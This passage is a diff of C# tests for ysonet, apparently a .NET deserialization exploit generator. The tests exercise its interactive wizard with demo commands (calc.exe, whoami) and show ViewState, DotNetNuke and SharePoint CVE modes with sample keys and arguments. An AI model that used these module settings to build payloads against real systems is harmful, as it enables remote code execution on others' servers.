@@ -52,18 +52,45 @@ namespace ysonet.Tests
             Run("Editor exposes actions and marks module-own options", EditorActionsAndOwnership);
             Run("Choice options are detected (modes, colon lists, numbered)", ChoiceDetection);
             Run("Bridged-chain setting offers bridge gadgets", BridgedChainChoices);
+            Run("Switching variant resets a stale, wrong-type command", VariantSwitchResetsCommand);
+            Run("Changed settings persist across modules; reset restores defaults", OptionsPersistAndReset);
+            Run("A typed command persists across gadget switches (not only on generate)", CommandPersistsAcrossGadgets);
+            Run("Shared settings carry from a gadget to a plugin", SettingsSharedGadgetToPlugin);
             Run("Themes apply and are named", ThemeApply);
             Run("Conditional plugin options are not marked required", ConditionalRequired);
+            Run("ViewState missing-payload error names the options to set", ViewStateModeErrorIsActionable);
+            Run("Informational plugin options (examples) are hidden from the editor", ExamplesHiddenFromEditor);
+            Run("Plugin modes drive which settings show, are required, and are passed", PluginModesDriveOptions);
+            Run("DotNetNuke modes select the payload mode and pass the right args", DotNetNukeModes);
+            Run("Clipboard modes scope format vs xamlvariant per mode", ClipboardModes);
+            Run("SharePoint modes select the CVE and scope its inner setting", SharePointModes);
+            Run("A space sets an explicit empty string, distinct from unset", ExplicitEmptyStringViaSpace);
+            Run("Interactive banner marks beta and shows the version", BannerShowsBetaAndVersion);
             Run("Show-command action prints the one-liner without generating", WizardShowCommand);
             Run("Generate and quit emits the payload and exits", WizardGenerateAndQuit);
             Run("Columns render in a virtual terminal (layout + per-cell highlight)", ColumnsRenderInVirtualTerminal);
+            Run("Typing filters the module list by substring", ColumnFilterNarrowsModules);
+            Run("Typing filters the settings list by substring", ColumnFilterNarrowsSettings);
+            Run("Module info panel shows facts while choosing a module", ModuleInfoPanelShowsFacts);
+            Run("FilterFields keeps substring matches and keeps order", FilterFieldsUnit);
+            Run("Help/description text is shown sentence-cased", SentenceCasingUnit);
             Run("Every top menu screen renders in a virtual terminal", AllMenusRender);
-            Run("Text editor shows the current value and replaces on type", TextEditReplaces);
+            Run("Text editor pre-fills and appends on type (no wipe)", TextEditAppends);
+            Run("Text editor caret moves and edits in place (Left/Home/Delete)", TextEditCaretEditing);
+            Run("Text editor word ops (Ctrl+Backspace, Ctrl+Left)", TextEditWordOps);
+            Run("Text editor wraps a long value in place across rows", TextEditWrapsInPlace);
+            Run("A focused setting's full value shows in the footer for copying", FocusedValueInFooter);
+            Run("LineEditBuffer inserts, deletes words, clears, and clamps the caret", LineEditBufferUnit);
             Run("Generate is blocked (not an exit) when required settings are empty", WizardBlocksMissingRequired);
+            Run("Blocked report enumerates every missing required setting", BlockedReportEnumeratesMissing);
+            Run("Blocked report shows the command's expected input and example", BlockedReportShowsCommandExample);
+            Run("Home/End jump to first/last setting in the columns", ColumnsHomeEndNav);
+            Run("Picker Home/End jump to first/last match", PickerHomeEnd);
             Run("Wizard remembers the last command", WizardRemembersLastCommand);
             Run("Run-all-formatters survives file/url gadgets", WizardRunAllFormatters);
             Run("Run-all-formatters saves payloads to a folder", WizardRunAllFormattersToFolder);
             Run("Clipboard plugin exposes the wpfxaml mode options", ClipboardWpfXamlOptions);
+            Run("Clipboard payloads actually trigger (winforms + wpfxaml variants)", ClipboardPayloadsTrigger);
             Run("Restrictive XAML load blocks the ObjectDataProvider gadget", RestrictiveXamlBlocksGadget);
 
             Console.Error.WriteLine();
@@ -581,12 +608,14 @@ namespace ysonet.Tests
             AssertTrue(mode != null && mode.Count == 2, "two lowercase modes");
             AssertTrue(mode.Contains("winforms") && mode.Contains("wpfxaml") && !mode.Contains("Xaml"), "CamelCase 'Xaml' excluded");
 
-            // And the real Clipboard plugin options come through as selects.
+            // And the real Clipboard plugin options come through as selects. Clipboard
+            // declares modes, so 'mode' is the mode picker (two delivery modes) and the
+            // inner xamlvariant is a choice shown in the wpfxaml mode.
             var editor = new ModuleEditor(null, null, false, null, null);
             var fields = editor.BuildFieldsForTest("Clipboard");
             EditableField modeField = FindEditable(fields, "mode");
             AssertTrue(modeField != null && modeField.Kind == FieldKind.Choice, "Clipboard mode is a choice");
-            AssertTrue(modeField.Choices.Contains("winforms") && modeField.Choices.Contains("wpfxaml"), "mode choices");
+            AssertTrue(modeField.Choices.Count == 2, "two delivery modes offered");
             EditableField xv = FindEditable(fields, "xamlvariant");
             AssertTrue(xv != null && xv.Kind == FieldKind.Choice, "xamlvariant is a choice");
         }
@@ -599,6 +628,332 @@ namespace ysonet.Tests
             AssertTrue(bgc != null && bgc.Kind == FieldKind.Choice, "bridged chain is a choice");
             AssertTrue(bgc.AllowCustom, "still allows a custom comma-separated chain");
             AssertTrue(bgc.Choices != null && bgc.Choices.Count > 0, "offers bridge-capable gadgets");
+        }
+
+        private static void VariantSwitchResetsCommand()
+        {
+            // XamlImageInfo v1 reads a file path, v2 runs a shell command. A command
+            // typed under the shell variant must NOT survive a switch to the file
+            // variant (where it would silently be used as a file path).
+            var editor = new ModuleEditor(null, null, true, null, null);
+            var fields = editor.BuildFieldsForTest("XamlImageInfo");
+            EditableField variant = FindEditable(fields, "variant");
+            EditableField command = FindEditable(fields, "command");
+            AssertTrue(variant != null && command != null, "variant and command fields present");
+            // The variant field is bound to its labels, in variant order (v1, v2).
+            AssertTrue(variant.Choices != null && variant.Choices.Count == 2, "two variant labels");
+            string v1Label = variant.Choices[0]; // v1 = file path
+            string v2Label = variant.Choices[1]; // v2 = shell command
+
+            // Select the shell-command variant and set a command.
+            variant.Value = v2Label;
+            editor.RefreshDynamicForTest();
+            command.Value = "whoami";
+            editor.RefreshDynamicForTest(); // stable type: the value is kept
+            AssertEqual("whoami", editor.CommandValueForTest, "command kept while type is unchanged");
+
+            // Switch to the file-path variant: the stale shell command is cleared.
+            variant.Value = v1Label;
+            editor.RefreshDynamicForTest();
+            AssertEqual("", editor.CommandValueForTest, "command reset when the input type changes");
+        }
+
+        private static void OptionsPersistAndReset()
+        {
+            // One session shared across module loads (this is what the real editor
+            // uses to carry values between modules).
+            var session = new WizardSession();
+            var editor = new ModuleEditor(null, null, false, null, session);
+
+            // Change a shared setting (outputpath) in one plugin, as an edit would.
+            var vs = editor.BuildFieldsForTest("ViewState");
+            EditableField op = FindEditable(vs, "outputpath");
+            AssertTrue(op != null, "outputpath present");
+            op.Value = "out.bin"; op.Touched = true;
+
+            // Open a different plugin: the same setting pre-fills from memory.
+            var dnn = editor.BuildFieldsForTest("DotNetNuke");
+            AssertEqual("out.bin", FindEditable(dnn, "outputpath").Value,
+                "a changed setting persists to another module that has it");
+
+            // Reset restores this module's defaults (outputpath default is empty).
+            editor.ResetToDefaultsForTest();
+            AssertEqual("", FindEditable(editor.CurrentFieldsForTest, "outputpath").Value,
+                "reset returns settings to their defaults");
+
+            // Reset also drops the remembered value, so it no longer propagates.
+            var vs2 = editor.BuildFieldsForTest("ViewState");
+            AssertEqual("", FindEditable(vs2, "outputpath").Value,
+                "reset cleared the remembered value too");
+
+            // An untouched default must NOT propagate (no clobbering other defaults).
+            var session2 = new WizardSession();
+            var editor2 = new ModuleEditor(null, null, false, null, session2);
+            editor2.BuildFieldsForTest("ViewState");                 // nothing touched
+            var dnn2 = editor2.BuildFieldsForTest("DotNetNuke");
+            AssertEqual("", FindEditable(dnn2, "outputpath").Value,
+                "untouched defaults do not leak into other modules");
+        }
+
+        private static void CommandPersistsAcrossGadgets()
+        {
+            // Type a command in one gadget and switch to another WITHOUT generating:
+            // the new gadget must show the typed command, not the old default. (The
+            // bug: the command was only saved at generate time.)
+            var session = new WizardSession();
+            var editor = new ModuleEditor(null, null, true, null, session);
+
+            var g1 = editor.BuildFieldsForTest("TypeConfuseDelegate");
+            EditableField cmd = FindEditable(g1, "command");
+            AssertTrue(cmd != null, "command field present");
+            cmd.Value = "mspaint"; cmd.Touched = true;
+
+            // Switching modules snapshots the current one, then seeds the next.
+            var g2 = editor.BuildFieldsForTest("ClaimsIdentity");
+            AssertEqual("mspaint", FindEditable(g2, "command").Value,
+                "the typed command carried to another gadget without generating");
+
+            // And back again shows the same, not the stale default.
+            var g3 = editor.BuildFieldsForTest("TypeConfuseDelegate");
+            AssertEqual("mspaint", FindEditable(g3, "command").Value,
+                "the typed command is still there when returning to the first gadget");
+        }
+
+        private static void SettingsSharedGadgetToPlugin()
+        {
+            // Two separate editors (gadget + plugin) that share one session, exactly
+            // like the real wizard. A setting changed in the gadget carries to a
+            // plugin that has the same-named setting.
+            var session = new WizardSession();
+
+            var gEditor = new ModuleEditor(null, null, true, null, session);
+            var g = gEditor.BuildFieldsForTest("TypeConfuseDelegate");
+            EditableField gop = FindEditable(g, "outputpath");
+            gop.Value = "shared.bin"; gop.Touched = true;
+            gEditor.SnapshotToMemoryForTest(); // simulates leaving the gadget editor
+
+            var pEditor = new ModuleEditor(null, null, false, null, session);
+            var p = pEditor.BuildFieldsForTest("ViewState");
+            AssertEqual("shared.bin", FindEditable(p, "outputpath").Value,
+                "a setting changed in a gadget carries to a plugin with the same setting");
+        }
+
+        private static void ViewStateModeErrorIsActionable()
+        {
+            // Only a validationkey, no payload source: generation must fail with a
+            // message that names what to set (not the old vague "mode" text), and it
+            // must NOT kill the process.
+            RunResult r = PayloadRunner.RunPlugin("ViewState",
+                new string[] { "-p", "ViewState", "--validationkey=70DBADBFF4B7A13BE67DD0B11B177936" });
+            AssertTrue(!r.Success, "fails without a payload source");
+            string m = (r.ErrorMessage ?? "").ToLowerInvariant();
+            AssertTrue(m.Contains("command") && m.Contains("dryrun") && m.Contains("unsignedpayload"),
+                "the error names the payload-source options: " + r.ErrorMessage);
+
+            // 'examples' must throw (caught) rather than exiting the process.
+            RunResult ex = PayloadRunner.RunPlugin("ViewState",
+                new string[] { "-p", "ViewState", "--examples" });
+            AssertTrue(!ex.Success, "examples does not generate a payload");
+            AssertTrue((ex.ErrorMessage ?? "").ToLowerInvariant().Contains("examples"),
+                "examples reports a clear message instead of exiting: " + ex.ErrorMessage);
+        }
+
+        private static void ExamplesHiddenFromEditor()
+        {
+            var vs = new ModuleEditor(null, null, false, null, null).BuildFieldsForTest("ViewState");
+            AssertTrue(FindEditable(vs, "examples") == null,
+                "the informational 'examples' toggle is not shown in the settings editor");
+            // Real payload options are still present.
+            AssertTrue(FindEditable(vs, "validationkey") != null, "validationkey still shown");
+            AssertTrue(FindEditable(vs, "mode") != null, "the mode picker is shown");
+        }
+
+        private static void PluginModesDriveOptions()
+        {
+            var editor = new ModuleEditor(null, null, false, null, null);
+            var vs = editor.BuildFieldsForTest("ViewState");
+
+            EditableField mode = FindEditable(vs, "mode");
+            AssertTrue(mode != null && mode.Kind == FieldKind.Choice, "a mode picker is shown");
+            AssertTrue(mode.Choices != null && mode.Choices.Count == 3, "three modes offered");
+
+            // Default mode = Exploit: command + validationkey required, gadget shown,
+            // the defining 'dryrun' flag hidden (implied by the mode).
+            EditableField command = FindEditable(vs, "command");
+            EditableField vkey = FindEditable(vs, "validationkey");
+            AssertTrue(command.Required, "exploit: command is required");
+            AssertTrue(vkey.Required, "exploit: validationkey is required");
+            AssertTrue(!FindEditable(vs, "gadget").Hidden, "exploit: gadget is shown");
+            // dryrun is the mode-defining flag: driven by the picker, not shown as a field.
+            AssertTrue(FindEditable(vs, "dryrun") == null, "exploit: dryrun is not a separate field (mode-driven)");
+            AssertTrue(FindEditable(vs, "unsignedpayload").Hidden, "exploit: unsignedpayload is hidden");
+
+            command.Value = "calc.exe"; command.Touched = true;
+            vkey.Value = "ABC"; vkey.Touched = true;
+            string exploitArgv = string.Join(" ", editor.PluginArgvForTest().ToArray());
+            AssertTrue(exploitArgv.Contains("--command") && exploitArgv.Contains("--validationkey"),
+                "exploit argv passes command and validationkey: " + exploitArgv);
+            AssertTrue(!exploitArgv.Contains("--dryrun"), "exploit argv has no --dryrun");
+            AssertTrue(!exploitArgv.Contains("--unsignedpayload"), "exploit argv has no --unsignedpayload");
+
+            // Switch to Dry run: only validationkey required; gadget/command hidden and
+            // NOT passed; the --dryrun flag is passed instead.
+            mode.Value = mode.Choices[1];
+            editor.RefreshDynamicForTest();
+            AssertTrue(FindEditable(vs, "validationkey").Required, "dryrun: validationkey required");
+            AssertTrue(FindEditable(vs, "command").Hidden, "dryrun: command hidden");
+            AssertTrue(FindEditable(vs, "gadget").Hidden, "dryrun: gadget hidden");
+            string dryArgv = string.Join(" ", editor.PluginArgvForTest().ToArray());
+            AssertTrue(dryArgv.Contains("--dryrun"), "dryrun argv passes --dryrun: " + dryArgv);
+            AssertTrue(!dryArgv.Contains("--command") && !dryArgv.Contains("--gadget"),
+                "dryrun argv drops command and gadget: " + dryArgv);
+
+            // A plugin without modes is unaffected: no mode picker.
+            var at = new ModuleEditor(null, null, false, null, null).BuildFieldsForTest("ApplicationTrust");
+            AssertTrue(FindEditable(at, "mode") == null, "a plugin without modes shows no mode picker");
+        }
+
+        private static void DotNetNukeModes()
+        {
+            var editor = new ModuleEditor(null, null, false, null, null);
+            var f = editor.BuildFieldsForTest("DotNetNuke");
+            EditableField mode = FindEditable(f, "mode");
+            AssertTrue(mode != null && mode.Choices.Count == 3, "three DotNetNuke modes");
+
+            // Default = run_command: command required; url/file hidden.
+            AssertTrue(FindEditable(f, "command").Required, "run_command: command required");
+            AssertTrue(FindEditable(f, "url").Hidden && FindEditable(f, "file").Hidden, "run_command: url/file hidden");
+            FindEditable(f, "command").Value = "calc.exe"; FindEditable(f, "command").Touched = true;
+            string a1 = string.Join(" ", editor.PluginArgvForTest().ToArray());
+            AssertTrue(a1.Contains("--mode run_command") && a1.Contains("--command"), "run_command argv: " + a1);
+            AssertTrue(!a1.Contains("--url") && !a1.Contains("--file"), "run_command argv excludes url/file");
+            RunResult r1 = PayloadRunner.RunPlugin("DotNetNuke", editor.PluginArgvForTest().ToArray());
+            AssertTrue(r1.Success, "run_command generates via CLI args: " + r1.ErrorMessage);
+
+            // Switch to write_file: file+url required and shown; command hidden.
+            mode.Value = mode.Choices[2];
+            editor.RefreshDynamicForTest();
+            AssertTrue(FindEditable(f, "file").Required && FindEditable(f, "url").Required, "write_file: file+url required");
+            AssertTrue(FindEditable(f, "command").Hidden, "write_file: command hidden");
+            FindEditable(f, "file").Value = "c:/temp/x.txt"; FindEditable(f, "file").Touched = true;
+            FindEditable(f, "url").Value = "http://a/b"; FindEditable(f, "url").Touched = true;
+            string a2 = string.Join(" ", editor.PluginArgvForTest().ToArray());
+            AssertTrue(a2.Contains("--mode write_file") && a2.Contains("--file") && a2.Contains("--url"), "write_file argv: " + a2);
+            AssertTrue(!a2.Contains("--command"), "write_file argv excludes command");
+        }
+
+        private static void ClipboardModes()
+        {
+            var editor = new ModuleEditor(null, null, false, null, null);
+            var f = editor.BuildFieldsForTest("Clipboard");
+            EditableField mode = FindEditable(f, "mode");
+            AssertTrue(mode != null && mode.Choices.Count == 2, "two clipboard modes");
+
+            // Default = winforms: format shown, xamlvariant hidden.
+            AssertTrue(!FindEditable(f, "format").Hidden, "winforms: format shown");
+            AssertTrue(FindEditable(f, "xamlvariant").Hidden, "winforms: xamlvariant hidden");
+            FindEditable(f, "command").Value = "calc.exe"; FindEditable(f, "command").Touched = true;
+            string a1 = string.Join(" ", editor.PluginArgvForTest().ToArray());
+            AssertTrue(a1.Contains("--mode winforms"), "winforms argv has mode: " + a1);
+            AssertTrue(!a1.Contains("--xamlvariant"), "winforms argv excludes xamlvariant");
+
+            // Switch to wpfxaml: xamlvariant shown, format hidden and dropped.
+            mode.Value = mode.Choices[1];
+            editor.RefreshDynamicForTest();
+            AssertTrue(!FindEditable(f, "xamlvariant").Hidden, "wpfxaml: xamlvariant shown");
+            AssertTrue(FindEditable(f, "format").Hidden, "wpfxaml: format hidden");
+            string a2 = string.Join(" ", editor.PluginArgvForTest().ToArray());
+            AssertTrue(a2.Contains("--mode wpfxaml"), "wpfxaml argv has mode: " + a2);
+            AssertTrue(!a2.Contains("--format"), "wpfxaml argv excludes format");
+        }
+
+        private static void SharePointModes()
+        {
+            var editor = new ModuleEditor(null, null, false, null, null);
+            var f = editor.BuildFieldsForTest("SharePoint");
+            EditableField mode = FindEditable(f, "mode");
+            AssertTrue(mode != null && mode.Choices.Count == 6, "six SharePoint CVE modes");
+            // The CVE selector is the mode picker, not a duplicate 'cve' field.
+            AssertTrue(FindEditable(f, "cve") == null, "cve is the mode, not a separate field");
+
+            // Default = CVE-2025-49704: inner 'variant' shown; gadget/useurl hidden.
+            AssertTrue(FindEditable(f, "command").Required, "command required");
+            AssertTrue(!FindEditable(f, "variant").Hidden, "49704: inner variant shown");
+            AssertTrue(FindEditable(f, "gadget").Hidden && FindEditable(f, "useurl").Hidden, "49704: gadget/useurl hidden");
+            FindEditable(f, "command").Value = "calc.exe"; FindEditable(f, "command").Touched = true;
+            string a1 = string.Join(" ", editor.PluginArgvForTest().ToArray());
+            AssertTrue(a1.Contains("--cve CVE-2025-49704"), "49704 argv has cve: " + a1);
+            AssertTrue(!a1.Contains("--gadget") && !a1.Contains("--useurl"), "49704 argv excludes gadget/useurl");
+
+            // Switch to CVE-2020-1147: inner 'gadget' shown; it generates via CLI.
+            mode.Value = mode.Choices[3];
+            editor.RefreshDynamicForTest();
+            AssertTrue(!FindEditable(f, "gadget").Hidden, "1147: gadget shown");
+            AssertTrue(FindEditable(f, "variant").Hidden, "1147: variant hidden");
+            string a2 = string.Join(" ", editor.PluginArgvForTest().ToArray());
+            AssertTrue(a2.Contains("--cve CVE-2020-1147") && a2.Contains("--gadget"), "1147 argv: " + a2);
+            RunResult r2 = PayloadRunner.RunPlugin("SharePoint", editor.PluginArgvForTest().ToArray());
+            AssertTrue(r2.Success, "1147 generates via CLI args: " + r2.ErrorMessage);
+
+            // Switch to CVE-2018-8421: inner 'useurl' shown; it generates via CLI.
+            mode.Value = mode.Choices[5];
+            editor.RefreshDynamicForTest();
+            AssertTrue(!FindEditable(f, "useurl").Hidden, "8421: useurl shown");
+            string a3 = string.Join(" ", editor.PluginArgvForTest().ToArray());
+            AssertTrue(a3.Contains("--cve CVE-2018-8421"), "8421 argv: " + a3);
+            RunResult r3 = PayloadRunner.RunPlugin("SharePoint", editor.PluginArgvForTest().ToArray());
+            AssertTrue(r3.Success, "8421 generates via CLI args: " + r3.ErrorMessage);
+        }
+
+        private static void BannerShowsBetaAndVersion()
+        {
+            var keys = new ScriptedKeyReader();
+            keys.Escape(); // quit at the top menu after the banner is shown
+            string stderr;
+            DriveWizard(keys, out stderr);
+            AssertTrue(stderr.ToLowerInvariant().Contains("beta"), "banner marks interactive mode as beta");
+            string ver = Wizard.ProductVersion();
+            AssertTrue(!string.IsNullOrEmpty(ver), "a product version is available");
+            AssertTrue(stderr.Contains(ver), "banner shows the product version (" + ver + ")");
+        }
+
+        private static void ExplicitEmptyStringViaSpace()
+        {
+            // viewStateUserKey is the real case: ViewState checks it with != null, so
+            // an empty string differs from unset. The space convention must let the
+            // user express that and pass it as --viewstateuserkey "".
+            var editor = new ModuleEditor(null, null, false, null, null);
+            var vs = editor.BuildFieldsForTest("ViewState");
+            EditableField k = FindEditable(vs, "viewstateuserkey");
+            AssertTrue(k != null, "viewstateuserkey field present");
+            AssertTrue(string.IsNullOrEmpty(k.Value) && !k.ExplicitEmpty, "starts unset");
+
+            // Unset is not passed on the command line.
+            AssertTrue(!string.Join("|", editor.PluginArgvForTest().ToArray()).Contains("--viewstateuserkey"),
+                "unset viewstateuserkey is not passed");
+
+            // One space -> an explicit empty string, shown distinctly and passed as "".
+            ModuleEditor.CommitTextForTest(k, " ");
+            AssertTrue(k.ExplicitEmpty && k.Value == "", "one space = explicit empty string");
+            AssertEqual("(empty string)", k.DisplayValue, "explicit empty shows distinctly (not '(unset)')");
+            string argv = string.Join("|", editor.PluginArgvForTest().ToArray());
+            AssertTrue(argv.Contains("--viewstateuserkey|"), "explicit empty is passed as --viewstateuserkey \"\": " + argv);
+
+            // Two spaces -> a single real space value; three -> two spaces.
+            ModuleEditor.CommitTextForTest(k, "  ");
+            AssertTrue(!k.ExplicitEmpty && k.Value == " ", "two spaces = one space value");
+            ModuleEditor.CommitTextForTest(k, "   ");
+            AssertTrue(!k.ExplicitEmpty && k.Value == "  ", "three spaces = two spaces");
+
+            // Mixed input is taken literally: leading/trailing spaces are NOT trimmed.
+            ModuleEditor.CommitTextForTest(k, " abc ");
+            AssertTrue(k.Value == " abc " && !k.ExplicitEmpty, "surrounding spaces preserved (not trimmed)");
+
+            // Truly empty input -> unset again (not passed).
+            ModuleEditor.CommitTextForTest(k, "");
+            AssertTrue(!k.ExplicitEmpty && string.IsNullOrEmpty(k.Value), "empty input -> unset");
+            AssertTrue(!string.Join("|", editor.PluginArgvForTest().ToArray()).Contains("--viewstateuserkey"),
+                "back to unset is not passed");
         }
 
         private static void ConditionalRequired()
@@ -654,8 +1009,60 @@ namespace ysonet.Tests
             byte[] stdout = DriveWizard(keys, out stderr);
 
             AssertEqual(0, stdout.Length, "blocked generation emits no payload");
-            AssertTrue(stderr.Contains("needs a value first"), "the user is told a value is needed");
+            AssertTrue(stderr.Contains("Not ready to generate"), "a clear not-ready report is shown");
+            AssertTrue(stderr.Contains("command") && stderr.Contains("Example:"),
+                "the report names the setting and shows an example");
             AssertTrue(stderr.Contains("Bye."), "the wizard is still running (reached the top-menu quit)");
+        }
+
+        private static void BlockedReportEnumeratesMissing()
+        {
+            // A plugin mode that requires several settings lists each missing one by
+            // name, so the user fixes them all at once (ViewState 'Exploit' needs a
+            // command and a validationkey).
+            var ed = new ModuleEditor(null, null, false, null, null);
+            ed.BuildFieldsForTest("ViewState");
+            List<string> probs = ed.MissingRequiredModeProblemsForTest();
+            AssertTrue(probs != null && probs.Count >= 2, "each missing required setting is enumerated");
+            bool cmd = false, vk = false;
+            foreach (string p in probs)
+            {
+                if (p.StartsWith("command")) cmd = true;
+                if (p.StartsWith("validationkey")) vk = true;
+                AssertTrue(p.Contains(":"), "each problem reads 'name: explanation' - " + p);
+            }
+            AssertTrue(cmd && vk, "both required ViewState settings are named: " + string.Join(" | ", probs.ToArray()));
+        }
+
+        private static void BlockedReportShowsCommandExample()
+        {
+            // A gadget whose -c is a URL (ObjRef) reports the expected input type and a
+            // concrete example, not just "a value is missing".
+            var ed = new ModuleEditor(null, null, true, null, null);
+            ed.BuildFieldsForTest("ObjRef");
+            string p = ed.MissingRequiredCommandProblemForTest();
+            AssertTrue(p != null, "a missing required command is reported");
+            AssertTrue(p.Contains("command") && p.Contains("URL") && p.Contains("Example:") && p.Contains("http"),
+                "the command problem names the setting, its type, and a URL example: " + p);
+        }
+
+        private static void ColumnsHomeEndNav()
+        {
+            // End jumps to the last setting (the Reset action, always last).
+            var end = DriveFrames(k => k.Enter().Enter().End().Escape().Escape().Escape());
+            AssertTrue(AnyFrame(end, "> [ Reset settings to defaults ]"), "End jumps to the last setting");
+        }
+
+        private static void PickerHomeEnd()
+        {
+            // End selects the last match, Home the first (deterministic list).
+            var items = new List<string> { "alpha", "bravo", "charlie", "delta" };
+            string last = WithSwallowedError(() =>
+                new Picker(new ScriptedKeyReader().End().Enter()).Show("pick", items, null));
+            AssertEqual("delta", last, "End selects the last item");
+            string first = WithSwallowedError(() =>
+                new Picker(new ScriptedKeyReader().End().Home().Enter()).Show("pick", items, null));
+            AssertEqual("alpha", first, "Home selects the first item");
         }
 
         private static void WizardGenerateAndQuit()
@@ -702,9 +1109,11 @@ namespace ysonet.Tests
                 var frames = keys.Frames;
                 AssertTrue(frames.Count >= 6, "a frame was captured per keypress");
 
-                // Modules-only frame: the settings/editor columns are hidden here.
-                Frame modules = FindFrame(frames, f => f.Contains("Gadgets") && !f.Contains(" | "));
-                AssertTrue(modules != null, "modules column renders alone (right columns hidden)");
+                // Module-list frame: the settings/editor columns are hidden here; the
+                // right side instead shows the highlighted gadget's info panel.
+                Frame modules = FindFrame(frames, f => f.Contains("Gadgets") && f.Contains("- Info")
+                    && f.Contains("Formatters:") && !f.Contains("[ Generate"));
+                AssertTrue(modules != null, "module list shows the info panel, not the settings columns");
 
                 // A three-column settings frame with the action rows.
                 Frame settings = FindFrame(frames, f => f.Contains(" | ") && f.Contains("[ Generate and quit ]"));
@@ -735,6 +1144,77 @@ namespace ysonet.Tests
             foreach (Frame f in frames)
                 if (pred(f)) return f;
             return null;
+        }
+
+        private static void ColumnFilterNarrowsModules()
+        {
+            // On the gadget module list, typing "Windows" narrows it to the gadgets
+            // whose name contains that substring. The active filter is tagged in the
+            // header, and a matching gadget is shown.
+            var frames = DriveFrames(k => k.Enter()              // build a gadget -> module list
+                .Type("Windows")                                 // filter the modules
+                .Escape().Escape().Escape());                    // clear filter, leave, quit
+            AssertTrue(AnyFrame(frames, "/Windows"), "the active module filter is tagged in the header");
+            AssertTrue(AnyFrame(frames, "WindowsIdentity"), "a substring match is shown while filtering");
+
+            // A filter that matches nothing produces a match-free list (no gadget rows),
+            // but does not crash the redraw.
+            var none = DriveFrames(k => k.Enter().Type("zznomatch").Escape().Escape().Escape());
+            AssertTrue(AnyFrame(none, "/zznomatch"), "a no-match filter is still tagged");
+        }
+
+        private static void ColumnFilterNarrowsSettings()
+        {
+            // Inside a gadget's settings, typing "out" narrows the list to the settings
+            // whose label contains "out" (output, outputpath).
+            var frames = DriveFrames(k => k.Enter().Enter()      // open the first gadget's settings
+                .Type("out")                                     // filter the settings
+                .Escape().Escape().Escape().Escape());
+            AssertTrue(AnyFrame(frames, "/out"), "the active settings filter is tagged in the header");
+            AssertTrue(AnyFrame(frames, "outputpath"), "a substring match is shown while filtering settings");
+        }
+
+        private static void ModuleInfoPanelShowsFacts()
+        {
+            // On the gadget module list (before opening one), the right side shows the
+            // highlighted gadget's info so a user can choose: its formatters and what
+            // the -c command means.
+            var gadget = DriveFrames(k => k.Enter().Escape().Escape());
+            AssertTrue(AnyFrame(gadget, "- Info"), "the info panel header shows for the highlighted gadget");
+            AssertTrue(AnyFrame(gadget, "Formatters:"), "the gadget info lists its formatters");
+            AssertTrue(AnyFrame(gadget, "Command input:"), "the gadget info states what the command means");
+
+            // On the plugin module list, the info panel lists the plugin's options.
+            var plugin = DriveFrames(k => k.Digit(2).Escape().Escape());
+            AssertTrue(AnyFrame(plugin, "- Info"), "the info panel header shows for the highlighted plugin");
+            AssertTrue(AnyFrame(plugin, "Options:"), "the plugin info lists its options");
+        }
+
+        private static void FilterFieldsUnit()
+        {
+            var fields = new List<EditableField>
+            {
+                new EditableField { Label = "command" },
+                new EditableField { Label = "output" },
+                new EditableField { Label = "outputpath" },
+                new EditableField { Label = "formatter" },
+            };
+            // Empty query is a pass-through (same list instance/contents).
+            AssertEqual(4, ModuleEditor.FilterFieldsForTest(fields, "").Count, "empty query keeps all");
+            var outp = ModuleEditor.FilterFieldsForTest(fields, "out");
+            AssertEqual(2, outp.Count, "two labels contain 'out'");
+            AssertEqual("output", outp[0].Label, "order is preserved");
+            AssertEqual("outputpath", outp[1].Label, "order is preserved");
+            // Case-insensitive substring, not just prefix.
+            AssertEqual(1, ModuleEditor.FilterFieldsForTest(fields, "MAND").Count, "case-insensitive substring match");
+        }
+
+        private static void SentenceCasingUnit()
+        {
+            AssertEqual("Hello there", ModuleEditor.SentenceForTest("hello there"), "lower-case first letter is capitalized");
+            AssertEqual("Already up", ModuleEditor.SentenceForTest("Already up"), "an already-capital first letter is left alone");
+            AssertEqual("'winforms' mode", ModuleEditor.SentenceForTest("'winforms' mode"), "a non-letter start (a quoted token) is left alone");
+            AssertEqual("", ModuleEditor.SentenceForTest(""), "empty stays empty");
         }
 
         // Drive the interactive UI against a fresh virtual terminal (real columns
@@ -771,7 +1251,7 @@ namespace ysonet.Tests
         {
             AssertTrue(AnyFrame(DriveFrames(k => k.Escape()), "Build a gadget payload"), "top menu renders");
             AssertTrue(AnyFrame(DriveFrames(k => k.Enter().Enter().Escape().Escape().Escape()), "[ Generate and quit ]"), "gadget settings render");
-            AssertTrue(AnyFrame(DriveFrames(k => k.Digit(2).Up().Enter().Escape().Escape().Escape()), "ViewState settings"), "plugin settings render");
+            AssertTrue(AnyFrame(DriveFrames(k => k.Digit(2).Up().Enter().Escape().Escape().Escape()), "ViewState Settings"), "plugin settings render");
             AssertTrue(AnyFrame(DriveFrames(k => k.Digit(3).Type("Json").Enter().Enter().Escape()), "Gadgets with a formatter"), "search formatters renders");
             AssertTrue(AnyFrame(DriveFrames(k => k.Digit(4).Escape().Escape()), "What kind of input"), "run-all-formatters renders");
             AssertTrue(AnyFrame(DriveFrames(k => k.Digit(6).Enter().Escape()), "Pick 'gadget'"), "help renders");
@@ -779,14 +1259,138 @@ namespace ysonet.Tests
             AssertTrue(AnyFrame(DriveFrames(k => k.Digit(7).Down().Escape().Escape()), "Pick a color theme"), "theme picker renders");
         }
 
-        private static void TextEditReplaces()
+        private static void TextEditAppends()
         {
-            // Open a gadget, edit the command (a text setting): the editor shows the
-            // current value as context and typing replaces it (does not append).
+            // Open a gadget, edit the command (a text setting). The box is pre-filled
+            // with the current value and the caret sits at the end, so typing APPENDS
+            // (it does not wipe the value). (Enter opens the gadget flow, Enter opens
+            // the first gadget, Down moves to 'command', Enter edits it.)
             var frames = DriveFrames(k => k.Enter().Enter().Down().Enter()
-                .Type("notepad").Escape().Escape().Escape().Escape());
-            AssertTrue(AnyFrame(frames, "(current: calc.exe)"), "the current value is shown as context");
-            AssertTrue(AnyFrame(frames, "> notepad_"), "typing replaces rather than appending to the current value");
+                .Type("X").Escape().Escape().Escape().Escape());
+            // The full value is echoed in the footer (so a long value stays visible for
+            // reading/copying); the edit box itself shows it with a block caret.
+            AssertTrue(AnyFrame(frames, "Editing command: calc.exe"), "the box is pre-filled with the current value");
+            AssertTrue(AnyFrame(frames, "Editing command: calc.exeX"), "typing appends at the end (does not replace)");
+
+            // Ctrl+U clears the whole line, so you can quickly type a fresh value.
